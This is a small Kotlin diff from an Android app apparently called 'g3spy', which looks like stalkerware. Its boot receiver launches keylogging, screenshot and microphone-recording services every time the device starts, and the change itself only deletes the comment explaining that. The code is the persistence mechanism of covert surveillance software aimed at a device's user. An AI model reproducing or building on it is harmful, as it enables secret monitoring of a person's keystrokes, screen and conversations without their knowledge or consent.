@@ -13,7 +13,7 @@ import com.g3spy.child.services.SmsService
 class BootReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
         if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
-            // Start all services when device boots
+            
             context.startService(Intent(context, KeyloggingService::class.java))
             context.startService(Intent(context, ScreenshotService::class.java))
             context.startService(Intent(context, MicRecordingService::class.java))
